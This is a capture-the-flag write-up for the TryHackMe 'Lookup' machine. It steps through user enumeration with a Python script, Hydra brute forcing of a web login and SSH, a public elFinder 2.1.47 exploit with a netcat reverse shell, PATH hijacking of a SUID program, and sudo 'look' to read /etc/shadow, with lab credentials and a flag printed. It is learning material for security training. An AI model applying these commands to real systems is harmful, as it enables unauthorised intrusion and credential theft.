{
    "note":"title must match route name in App.js",
    "title":"Lookup",
    "path":"lookup",
    "tags":["hydra","bruteforcing","easy","linux password", "box", "thm","web","python","user enumeration","elfinder 2.1.47", "linux", "privesc", "ssh", "dictionary attack", "cve", "login panel", "nc", "php","rce","reverse shell"],
    "date":"27/06/2023",
    "location": "./writeup/",
    "banner":"writeup/lookup/banner.gif",
    "type":"writeup",
    "search":[
        {
            "section":"Scanning",
            "description":"Scanning with Nmap, discovering ports 22 ssh and 80 http"
        },
        {
            "section":"Setting /etc/hosts",
            "description":"Adding the domain to /etc/hosts"
        },
        {
            "section":"Directory bruteforcing",
            "description":"Directory bruteforcing with gobuster including file extentions for comprehensinve scanning"
        },
        {
            "section":"User enumeration",
            "description":"Enumerating users with python script, setting request headers and implementing multi threading for faster execution"
        },
        {
            "section":"Bruteforcing password",
            "description":"Brute force login panel password field with Hydra and wordlist sending post form"
        },
        {
            "section":"Shell as www-data",
            "description":"Exploiting elFinder 2.1.47 wiht public CVE to obtain a reverse shell"
        },
        {
            "section":"SUID program to exploit",
            "description":"Performing enumeration and checking for programs with SUID"
        },
        {
            "section":"Hijackin program execution",
            "description":"Hijacking and redirecting the execution of the <i>id</i> command to a maliciously crafted version of the program by modifying the PATH environment variable. By prepending a custom path to the PATH variable, the system is directed to execute the malicious version of <i>id</i> instead of the legitimate one. This causes it to behave differently and produce intended malicious output, which can be leveraged for command hijacking or local privilege escalation."
        },
        {
            "section":"Hijackin program execution",
            "description":"Altered and change the PATH variable to redirect program execution to a malicious one"
        },
        {
            "section":"Bruteforcing SSH password",
            "description":"Bruteforcing SSH password with Hydra using wordlist"
        },
        {
            "section":"Bruteforcing SSH password",
            "description":"Logging with SSH using the password"
        },
        {
            "section":"Privilege escalation",
            "description":"Attept cracking Linux password from shadow file of root user"
        },
        {
            "section":"Privilege escalation",
            "description":"Reading root's id_rsa file by exploiting <i>look</i> program with GTFOBins and log in as root via SSH with id_rsa authentication"
        }
    ],
    "body":[
        {
            "id":"Ignite",
            "title":"<h1> <span style=\"color:#da1953\">Ign</span>ite</h1><hr>",
            "body":[
                {
                    "id":"banner",
                    "title":"",
                    "body":[
                        "<img src=\"/cyber/writeup/lookup/banner.gif\" alt=\"\">"
                    ]
                },
                {
                    "id":"Scanning",
                    "title":"<hr><h1><span style=\"color:#da1953\">Sca</span>nning</h1>",
                    "body":[
                        "<p>Description of found ports.</p>",
                        "<p><pre>$ nmap -sC -sV -oN nmap 10.10.14.33<br>Nmap scan report for 10.10.14.33<br>Host is up (0.032s latency).<br>Not shown: 998 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)<br>|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)<br>|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Did not follow redirect to http://lookup.thm<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></pre></p>",
                        "<p>I have four services: port 22 SSH< and HTTP 80 with Apache 2.4.41.</p>"
                    ]
                },
                {
                    "id":"Enumeration",
                    "title":"<h1><span style=\"color:#da1953\">Enum</span>eration</h1>",
                    "body":[
                        {
                            "id":"Setting hots",
                            "title":"<h2>Setting /etc/hosts<h2>",
                            "body":[
                                "<p>Trying to access the web page at port 80, gave me a <i>\"The connection has timed out\"</i> error, for some reason, my browser was not able to reach the page. By searching for this error I found out that the application was redirecting to <b>lookup.htm</b> and it was not possible to reach out until I added the host in <i>/etc/hosts<i>.</p>",
                                "<p>To do so I executed sudo vim <i>/etc/hosts</i> and added 2 new entries in the file:<br><i>10.10.114.228   files.lookup.thm<br>10.10.114.228   files.lookup.thm</i><br>now my <i>/etc/hosts</i> looks like the following.</p>",
                                "<p><pre>127.0.0.1  localhost<br>127.0.1.1  kali<br>10.10.114.228   lookup.thm<br>10.10.114.228   files.lookup.thm<br># The following lines are desirable for IPv6 capable hosts<br>::1   localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br></pre></p>",
                                "<p>Refreshing the page Im able to access the page.</p>"
                            ]
                        },
                        {
                            "id":"Directory bruteforcing",
                            "title":"<h2>Directory bruteforcing</h2>",
                            "body":[
                                "<p>The first I did was a directory bruteforce with gobuster: <code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://lookup.thm/ -x .php,.txt,.jsp,.xml | tee gobuster</code></p>",
                                "<p>the <b>-x</b> indicate file extention to check and the command <b>tee</b> redirects the output ot a file similarly to the <b>&gt;</b> but it also prints the command output in the terminal. The pages found by Gobuster are shown below:",
                                
                                "<p><img src=\"/cyber/writeup/lookup/gobuster.PNG\" alt=\"\"></p>"
                            ]
                        },
                        {
                            "id":"User enumeration",
                            "title":"<h2>User enumeration</h2>",
                            "body":[
                                "<p>Navigating to the IP address or to <i>lookup.thm</i> I am presented with a login panel and I noticed that I am not in the <i>/login.php</i> path, hmm...</p>", 
                                "<p><img src=\"/cyber/writeup/lookup/loginurl.PNG\" alt=\"\"></p>",

                                "<p>Analysing with BurpSuite</p>",
                                "<p><div class=\"http-request\"><span class=\"method\">POST</span> <span class=\"path\">/login.php</span> <span class=\"version\">HTTP/1.1</span><br><span class=\"header-key\">Host:</span> <span class=\"header-value\">lookup.thm</span><br><span class=\"header-key\">User-Agent:</span><span class=\"header-value\">Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class=\"header-key\">Accept:</span> <span class=\"header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"header-key\">Accept-Language:</span> <span class=\"header-value\">en-US,en;q=0.5</span><br><span class=\"header-key\">Accept-Encoding:</span> <span class=\"header-value\">gzip, deflate, br</span><br><span class=\"header-key\">Content-Type:</span><span class=\"header-value\">application/x-www-form-urlencoded</span><br><span class=\"header-key\">Content-Length:</span> <span class=\"header-value\">29</span><br><span class=\"header-key\">Origin:</span> <span class=\"header-value\">http://lookup.thm</span><br><span class=\"header-key\">Connection:</span> <span class=\"header-value\">keep-alive</span><br><span class=\"header-key\">Referer:</span> <span class=\"header-value\">http://lookup.thm/</span><br><span class=\"header-key\">Upgrade-Insecure-Requests:</span> <span class=\"header-value\">1</span><br><br><span class=\"body\"><span class=\"post-key\">username</span><span class=\"equals\">=</span><span class=\"post-value\">admin</span>&amp;<span class=\"post-key\">password</span><span class=\"equals\">=</span><span class=\"post-value\">admin</span> </span> </div> </pre></p>",

                                "<p><i>Now at this point, I have tried different enumerations to gain as much information as possible, manually or using automated enumeration tools such as Gobuster or Nikto. One of my big mistakes was to assume that if there was no mention of any users on the website it meant I didn't have to enumerate them. This is because, in my past challenges, there were users mentioned on the website, and usually they were the users to compromise.</i></p>",

                                "<p>I tried different combinations of usernames and passwords starting from commonly used default credentials and random usernames and passwords. I noticed that when trying the username <i>admin</i> I have a different error message. Normally by using random credentials the error message says <b>Wrong username or password. Please try again. Redirecting in 3 seconds.</b>.</p>",
                                "<p><img src=\"/cyber/writeup/lookup/erro1.PNG\" alt=\"\"></p>",
                                "<p>While using <i>admin</i> as a username, and a random password the error message changes to <b>Wrong password. Please try again. Redirecting in 3 seconds.</b>.</p>",
                                "<p><img src=\"/cyber/writeup/lookup/erro2.PNG\" alt=\"\"></p>",
                                "<p>This means I can enumerate users and check what users are registered in the system, and then given a username I can bruteforce the password, maybe? To enumerate the users I wrote the following Python scripts that test usernames from a wordlist and check the result returned by the server. Also the erro message path is at <i>/login.php</i> so the URL in the script is <i>http://lookup.thm/login.php/</i> as this is the URL used to send the credentals. The headers are simplied copied fomr Burp's request.</p>",
                                
                                
                                "<p><pre class=\"python-code\"><span class=\"keyword\">#!/usr/bin/python</span><br><span class=\"keyword\">from</span> concurrent.futures <span class=\"keyword\">import</span> ThreadPoolExecutor, as_completed<br><span class=\"keyword\">import</span> requests<br><span class=\"keyword\">import</span> sys<br><br><span class=\"function\">url</span> = <span class=\"string\">'http://lookup.thm/login.php/'</span><br><br><span class=\"keyword\">def</span> <span class=\"function\">userenum</span>(username):<br>   headers = {<br>       <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,<br>       <span class=\"string\">'Accept'</span>: <span class=\"string\">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'</span>,<br>       <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'en-US,en;q=0.5'</span>,<br>       <span class=\"string\">'Accept-Encoding'</span>: <span class=\"string\">'gzip, deflate, br'</span>,<br>       <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/x-www-form-urlencoded'</span>,<br>       <span class=\"string\">'Content-Length'</span>: <span class=\"string\">'33'</span>,<br>       <span class=\"string\">'Origin'</span>: <span class=\"string\">'http://lookup.thm'</span>,<br>       <span class=\"string\">'Connection'</span>: <span class=\"string\">'keep-alive'</span>,<br>       <span class=\"string\">'Referer'</span>: <span class=\"string\">'http://lookup.thm/'</span>,<br>       <span class=\"string\">'Upgrade-Insecure-Requests'</span>: <span class=\"string\">'1'</span><br>   }<br>   <br>   myobj = {<span class=\"string\">'username'</span>: username, <span class=\"string\">'password'</span>: <span class=\"string\">'testpass'</span>}<br>   x = requests.post(url, data=myobj, headers=headers)<br>   <span class=\"keyword\">if</span> <span class=\"string\">\"Wrong username\"</span> <span class=\"keyword\">not in</span> x.text:<br>       print(username)<br>       exit()<br><br>f = open(sys.argv[1], <span class=\"string\">'r'</span>)<br>usernames = f.read().splitlines()<br>num_threads = 10<br><br><span class=\"keyword\">def</span> <span class=\"function\">test_usernames_in_batches</span>(usernames, num_threads):<br>   <span class=\"keyword\">with</span> ThreadPoolExecutor(max_workers=num_threads) <span class=\"keyword\">as</span> executor:<br>       <span class=\"comment\"># Submit all tasks in chunks to avoid memory overload</span><br>       <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(0, len(usernames), num_threads):<br>           batch = usernames[i:i + num_threads]<br>           futures = {executor.submit(userenum, username): username <span class=\"keyword\">for</span> username <span class=\"keyword\">in</span> batch}<br><br>           <span class=\"comment\"># Process results as they complete</span><br>           <span class=\"keyword\">for</span> future <span class=\"keyword\">in</span> as_completed(futures):<br>               username = futures[future]<br>               <span class=\"keyword\">try</span>:<br>                   future.result()  <span class=\"comment\"># To raise any exceptions if they occurred</span><br>               <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:<br>                   print(<span class=\"string\">f\"Error processing {username}: {e}\"</span>)<br><br>test_usernames_in_batches(usernames, num_threads)<br></pre></p>",

                                "<p>For this code, I took help from ChatGPT because the first version was single-threaded and it was very slow, I didn't how to create more threads. <span style=\"color:#FFC107\">Note that ChatGPT or similar AIs are banned during OSCP and may be the same for other certifications as well. During this box, I didn't know that.</span></p>",
                                "<p>After quite a bit my script found a username, <b>jose</b>. Now I can proceed to brute force Jose's password with Hydra using <i>rockyou.txt</i> wordlist.</p>",
                                "<p><img src=\"/cyber/writeup/lookup/jose.PNG\" alt=\"\"></p>"
                            ]
                        }                                              
                    ]
                },
                {
                    "id":"Bruteforcing password",
                    "title":"<h1><span style=\"color:#da1953\">Bru</span>teforcing password</h1>",
                    "body":[
                        "<p>The command I executed is:<br><code>$ hydra -l jose -P /usr/share/wordlists/rockyou.txt -f -V lookup.thm http-post-form \"/login.php:username=^USER^&password=^PASS^:Wrong\" -V</code>",
                        "<p><pre>$ hydra -l jose -P /usr/share/wordlists/rockyou.txt -f -V lookup.thm http-post-form \"/login.php:username=^USER^&password=^PASS^:Wrong\" -V<br>Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-29 20:44:18<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"123456\" - 1 of 14344399 [child 0] (0/0)<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"12345\" - 2 of 14344399 [child 1] (0/0)<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"123456789\" - 3 of 14344399 [child 2] (0/0)<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"password\" - 4 of 14344399 [child 3] (0/0)<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"iloveyou\" - 5 of 14344399 [child 4] (0/0)<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"princess\" - 6 of 14344399 [child 5] (0/0)<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"1234567\" - 7 of 14344399 [child 6] (0/0)<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"rockyou\" - 8 of 14344399 [child 7] (0/0)<br><br>[...SNIPPED...]<br><br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"sniper\" - 1413 of 14344399 [child 14] (0/0)<br>[ATTEMPT] target lookup.thm - login \"jose\" - pass \"erica\" - 1414 of 14344399 [child 6] (0/0)<br>[<b>80</b>][<b>http-post-form</b>] host: <b>lookup.thm</b>   login: <b>jose</b>   password: <b>password123</b><br>[STATUS] attack finished for lookup.thm (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-29 20:41:28<br></pre></p>",
                        "<p>Now let's try to attemp a login with this credentials <b>jose</b>:<b>passowrd123</b>.</p>"
                    ]
                },      
                {
                    "id":"Shell as www-data",
                    "title":"<h1><span style=\"color:#da1953\">She</span>ll as www-data</h1>",
                    "body":[
                        "<p>Once successfully logged in I am inside an application called Elffinder.</p>",
                        "<blockquote>elFinder is an open-source file manager for web, written in JavaScript using jQuery UI. Creation is inspired by simplicity and convenience of Finder program used in Mac OS X operating system.</blockquote>",
                        "<p><img src=\"/cyber/writeup/lookup/elfinder.PNG\" alt=\"\"></p>",
                        "<p>I inspected different files I was able to access and found different information such as names, but nothing interesting they seemed not useful in this situation</p>",
                        "<p><img src=\"/cyber/writeup/lookup/usertxt.PNG\" alt=\"\"></p>",
                        "<p>The second thing was to check the version of the application by clicking on the <b>?</b> question mark icon.</p>",
                        "<p><img src=\"/cyber/writeup/lookup/elfinderinfoicon.PNG\" alt=\"\"></p>",
                        "<p><img src=\"/cyber/writeup/lookup/elfinderversion.PNG\" alt=\"\"></p>",
                        "<p>A quick search on Google shows that the version is vulnerable. I tried many of the available exploits but ended up being able to successfully get a shell with this one from <a href=\"https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce/blob/main/exploit.py\">GitHub</a></p>",
                        "<p><img src=\"/cyber/writeup/lookup/exploitsearch.png\" alt=\"\"></p>",
                        "<p>I set my listener with NetCat as <code>nc -lvnp 4444</code> and run the exploit as <code>python3 ./exploit.py.1 -t http://files.lookup.thm/elFinder/ -lh 10.21.112.161 -lp 4444</code>.</p>",
                        "<p><img src=\"/cyber/writeup/lookup/runexploit.PNG\" alt=\"\"></p>",
                        "<p><img src=\"/cyber/writeup/lookup/revshell.PNG\" alt=\"\"></p>",
                        "<p>As a user <i>www-data</i> I am not able to access the user flag, I must become user <i>think</i>.</p>",
                        "<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /home<br>cd /home<br>www-data@lookup:/home$ ls<br>ls<br>think<br>www-data@lookup:/home$ cd /think<br>cd /think<br>bash: cd: /think: No such file or directory<br>www-data@lookup:/home$ ls think  <br>ls think<br>user.txt<br>www-data@lookup:/home$ cat ./think/user.txt<br>cat ./think/user.txt<br>cat: ./think/user.txt: Permission denied<br></pre></p>"
                    ]
                },
                {
                    "id":"Shell as Think",
                    "title":"<h1><span style=\"color:#da1953\">She</span>ll as Think</h1>",
                    "body":[
                        "<p>Now that I have the shell it is time to privilege escalation.The first thing I check once I have a shell is the command the current user can run as sudo, and for that, I use <code>sudo -l</code>. In this case, it is giving me an error which I honestly don't know what is it.</p>",
                        "<p><img src=\"/cyber/writeup/lookup/sudoerror.PNG\" alt=\"\"></p>",
                        "<p>The next step is to check what users are available in the system as the <i>www-data</i> user al always limited in actions. Maybe other real users are less limited and are able to run more commands, and hopefully with sudo privileges. To check the available users in the system I run the following command <code>cat /etc/passwd | grep /bin/bash</code></p>",
                        "<p><img src=\"/cyber/writeup/lookup/systemusers.PNG\" alt=\"\"></p>",
                        "<p>There are only 2 users in the system, root and <i>think</i>.<p>",
                        
                        {
                            "id":"SUID program to exploit",
                            "title":"<h2>SUID program to exploit</h2>",
                            "body":[
                                "<p>Now I have to do lateral movement and compromise <i>think</i> and access as <i>think</i> user. Continuing my enumeration the next step is what program I can run with SUID. At this point, I do not know what will lead me in the right direction I am just following a <a href=\"https://github.com/intotheewild/OSCP-Checklist/blob/main/03a.%20Linux%20Privilege%20Escalation.md\">Linux Privilege Escalation</a> checklist found on Google used for the OSCP exam, kind of blindly.</p>",

                                "<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ find / -perm -u=s -type f 2>/dev/null<br>&lt;elFinder/php$ find / -perm -u=s -type f 2>/dev/null<br>/snap/snapd/19457/usr/lib/snapd/snap-confine<br>/snap/core20/1950/usr/bin/chfn<br>/snap/core20/1950/usr/bin/chsh<br>/snap/core20/1950/usr/bin/gpasswd<br>/snap/core20/1950/usr/bin/mount<br>/snap/core20/1950/usr/bin/newgrp<br>/snap/core20/1950/usr/bin/passwd<br>/snap/core20/1950/usr/bin/su<br>/snap/core20/1950/usr/bin/sudo<br>/snap/core20/1950/usr/bin/umount<br>/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/snap/core20/1950/usr/lib/openssh/ssh-keysign<br>/snap/core20/1974/usr/bin/chfn<br>/snap/core20/1974/usr/bin/chsh<br>/snap/core20/1974/usr/bin/gpasswd<br>/snap/core20/1974/usr/bin/mount<br>/snap/core20/1974/usr/bin/newgrp<br>/snap/core20/1974/usr/bin/passwd<br>/snap/core20/1974/usr/bin/su<br>/snap/core20/1974/usr/bin/sudo<br>/snap/core20/1974/usr/bin/umount<br>/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/snap/core20/1974/usr/lib/openssh/ssh-keysign<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/sbin/pwm<br>/usr/bin/at<br>/usr/bin/fusermount<br>/usr/bin/gpasswd<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/newgrp<br>/usr/bin/pkexec<br>/usr/bin/umount<br></pre></p>",

                                "<p>What caught my eye was the program <b>/usr/sbin/pwm</b>, it is an uncommon program that never found in my previous challenges, but it is worth looking into by runnig it.</p>",
                                "<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ /usr/sbin/pwm<br>&lt;.lookup.thm/public_html/elFinder/php$ /usr/sbin/pwm<br>[!] Running 'id' command to extract the username and user ID (UID)<br>[!] ID: www-data<br>[-] File /home/www-data/.passwords not found</pre></p>",

                                "<p>Very interesting! It runs the command <b>Id</b> that outputs something like this <i>uid=33(www-data) gid=33(www-data) groups=33(www-data)</i> to find the username and try to access the home directory by crafting the path with the name extracted from the command <b>Id<b>.</p>",
                                "<p>Giving a quick look at the home directory I can see that www-data has no home folder so the program <b>/usr/sbin/pwm</b> can't access such a folder. But the think do have a home folder. Only if I could provide the <i>think</i> user's <b>Id</b> instead of <i>www-data</i>...</p>",
                                "<p><img src=\"/cyber/writeup/lookup/meme.jpg\" alt=\"\"></p>"
                            ]
                        },
                        {
                            "id":"Hijackin program execution",
                            "title":"<h2>Hijackin program execution</h2>",
                            "body":[
                                "<p>To go further I have to understand how Linux programs are executed from the terminal. The question to ask is: how does the terminal know where the program is when I write the name in the terminal like id, pwd, ls etc.? It uses a variable called PATH that lists a series of folder to check if they contains any program with the spcified name.</p>",
                                "<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ echo $PATH<br>&lt;les.lookup.thm/public_html/elFinder/php$ echo $PATH                <br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br></pre></p>",

                                "<p>in this case the search paths are <i>/usr/local/sbin</i>, <i>/usr/local/bin</i>, <i>/usr/sbin</i>, <i>/usr/bin</i>, <i>/sbin</i>, <i>/bin</i>, and the first match will be executed as it check these folder in order. Each user has their own list of paths stored in the PATH variable. This means different users can have different paths where the system looks for programs. If a new path is added at the beginning of the list, the system will check that path first before looking at others. If it finds the program there, it wonâ€™t check the rest of the paths. This can be used to trick the system. For example, if someone adds a fake version of a command (like id) in a path that comes first, the system will run that fake command instead of the real one. The path I am going to use is <i>/tmp</i> as it is unresticted and I have read and write permission.</p>",
                                "<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ export PATH=/tmp:$PATH<br>&lt;hm/public_html/elFinder/php$ export PATH=/tmp:$PATH                <br>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ echo $PATH<br>&lt;les.lookup.thm/public_html/elFinder/php$ echo $PATH                <br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br></pre></p>",
                                "<p>Now that <i>/tmp</i> is at the beginning of the <b>PATH</b>, if a program named <b>id</b> exists there, it will run instead of the real one. The idea is to create a new id program that gives as output the id of the user think instead of <i>www-data</i>. So first of all I need to know what the output of the real id of the user think is.</p>",
                                "<p><pre>www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /tmp<br>cd /tmp<br>www-data@lookup:/tmp$ id think<br>id think<br>uid=1000(think) gid=1000(think) groups=1000(think)<br></pre></p>",
                                "<p>Now that we know the output of the <b>id</b> command of think user I can craft the simple bash program to give the exact same output.</p>",
                                "<p><pre>echo -e '#!/usr/bin/bash\\necho \"uid=1000(think) gid=1000(think) groups=1000(think)\"' > id</pre></p>",
                                "<p>Now by running the program <b>/usr/sbin/pwm</b> I have a whole different output and it looks like a password wordlist.</p>",
                                "<p><pre>www-data@lookup:/tmp$ /usr/sbin/pwm<br>/usr/sbin/pwm<br>[!] Running 'id' command to extract the username and user ID (UID)<br>[!] ID: think<br>jose1006<br>jose1004<br>jose1002<br>jose1001teles<br>jose100190<br>jose10001<br>jose10.asd<br>jose10+<br>jose0_07<br>jose0990<br>jose0986$<br>jose098130443<br>jose0981<br>jose0924<br>jose0923<br>jose0921<br>thepassword<br>jose(1993)<br>jose'sbabygurl<br>jose&vane<br>jose&takie<br>jose&samantha<br>jose&pam<br>jose&jlo<br>jose&jessica<br>jose&jessi<br>josemario.AKA(think)<br>jose.medina.<br>jose.mar<br>jose.luis.24.oct<br>jose.line<br>jose.leonardo100<br>jose.leas.30<br>jose.ivan<br>jose.i22<br>jose.hm<br>jose.hater<br>jose.fa<br>jose.f<br>jose.dont<br>jose.d<br>jose.com}<br>jose.com<br>jose.chepe_06<br>jose.a91<br>jose.a<br>jose.96.<br>jose.9298<br>jose.2856171<br></pre></p>"
                            ]
                        },
                        {
                            "id":"Bruteforcing SSH password",
                            "title":"<h2>Bruteforcing SSH password</h2>",
                            "body":[
                                "Now the only other application that is left to compromise is the SSH. So I will try brute-forcing the think user's password with the wordlist found. But first I will save this list in a file on my local computer just by copy-pasting it from the terminal.",
                                "<p>Now the only other application that is left to compromise is the SSH. So I will try brute-forcing the think user's password with the wordlist found. But first I will save this list in a file on my local computer just by copy-pasting it from the terminal and naming the file \"thinkoutput\". <code>hydra -l think -P ./thinkoutput 10.10.99.62 ssh -t 20</code></p>",
                                "<p><pre>$ hydra -l think -P ./thinkoutput 10.10.99.62 ssh -t 20<br>Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-30 09:14:51<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 20 tasks per 1 server, overall 20 tasks, 50 login tries (l:1/p:50), ~3 tries per task<br>[DATA] attacking ssh://10.10.99.62:22/<br>[<b>22</b>][<b>ssh</b>] host: <b>10.10.99.62</b>   login: <b>think</b>   password: <b>josemario.AKA(think)</b><br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 3 final worker threads did not complete until end.<br>[ERROR] 3 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-30 09:14:58<br></pre></p>",
                                "<p>I can now log in as user think via SSH. <code>ssh think@10.10.99.62</code></p>",
                                "<p><pre>$ ssh think@10.10.99.62<br>The authenticity of host '10.10.99.62 (10.10.99.62)' can't be established.<br>ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.<br>This host key is known by the following other names/addresses:<br>    ~/.ssh/known_hosts:6: [hashed name]<br>    ~/.ssh/known_hosts:7: [hashed name]<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added '10.10.99.62' (ED25519) to the list of known hosts.<br>think@10.10.99.62's password: <br>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Thu 30 Jan 2025 02:19:12 PM UTC<br><br>  System load:  0.0               Processes:             131<br>  Usage of /:   59.7% of 9.75GB   Users logged in:       0<br>  Memory usage: 23%               IPv4 address for ens5: 10.10.99.62<br>  Swap usage:   0%<br><br><br>Expanded Security Maintenance for Applications is not enabled.<br><br>7 updates can be applied immediately.<br>To see these additional updates run: apt list --upgradable<br><br>Enable ESM Apps to receive additional future security updates.<br>See https://ubuntu.com/esm or run: sudo pro status<br><br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br><br>Last login: Sun May 12 12:07:25 2024 from 192.168.14.1<br><b>think@lookup</b>:~$ <br></pre></p>",
                                "<p>As user <i>think</i> I am able to retrieve the user flag.</p>",
                                "<p><pre><b>think@lookup</b>:~$ ls<br>user.txt<br><b>think@lookup</b>:~$ cat user.txt <br>38375fb4dd8baa2b2039ac03d92b820e<br></pre></p>"
                            ]
                        }
                    ]
                },
                {
                    "id":"Privilege escalation",
                    "title":"<h1><span style=\"color:#da1953\">Pri</span>vilege escalation</h1>",
                    "body":[
                        "<p>The first enumeration I always perform as mentioned earlier is to check what command the user can run as sudo, I do that by running <code>sudo -l</code>.</p>",
                        "<p><pre><b>think@lookup</b>:~$ sudo -l<br>[sudo] password for think:<br>Matching Defaults entries for think on lookup:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin<br><br>User think may run the following commands on lookup:<br>    (ALL) /usr/bin/look<br></pre></p>",
                        "<p>The user think can run the command <b>look</b> in <b>/usr/bin/look</b> with sudo privilege. At the time of doing this box, I never encountered this program. My only hope is that <a href=\"https://gtfobins.github.io/\">GTFOBins</a> has the commands to exploit it. Luckily it has the <a href=\"https://gtfobins.github.io/gtfobins/look/\">exploit</a> for the command look and I can read arbitrary files. Follwing the commands to execute to read arbitrary files.</p>",
                        "<p><pre>LFILE=file_to_read<br>sudo look '' \"$LFILE\"</pre></p>",
                        "<p>The first thing I tried to read was the file <i>/etc/shadow</i> and attempted to crack the password.</p>",
